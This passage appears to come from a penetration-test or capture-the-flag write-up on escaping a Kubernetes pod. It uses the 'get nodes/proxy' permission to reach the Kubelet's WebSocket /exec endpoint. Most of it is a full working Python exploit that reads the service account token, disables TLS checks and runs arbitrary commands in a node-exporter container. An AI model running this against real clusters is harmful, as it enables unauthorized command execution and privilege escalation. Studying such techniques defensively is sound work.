The key takeaway: get nodes/proxy — the gateway upon which I will build everything else. Node Escape

I first attempt the standard Kubelet exec path through the Kubernetes API, but it is rejected because the service account only has get nodes/proxy and lacks create nodes/proxy. A direct HTTP request to the Kubelet's /run endpoint is also denied. This leads me to investigate the Kubelet's WebSocket-based /exec endpoint, which the get nodes/proxy permission is sufficient to reach.

I use exploit.py, a WebSocket client that talks directly to the Kubelet and runs commands inside the node-exporter container.

exploit.py 
cat > /tmp/exploit.py << 'EOF'
import asyncio, ssl, sys, websockets

NODE = "<IP>"
NE_NS, NE_POD, NE_CNT = "monitoring", "prometheus-prometheus-node-exporter-nmntq", "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    args = "&".join(f"command={p}" for p in cmd.split())
    url = f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}?output=1&error=1&{args}"
    async with websockets.connect(url, ssl=ctx, additional_headers={"Authorization": f"Bearer {TOKEN}"},
                                   subprotocols=["v4.channel.k8s.io"], open_timeout=10) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    print(data[1:].decode(errors='replace'), end='')
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(ws_exec(COMMAND))
EOF
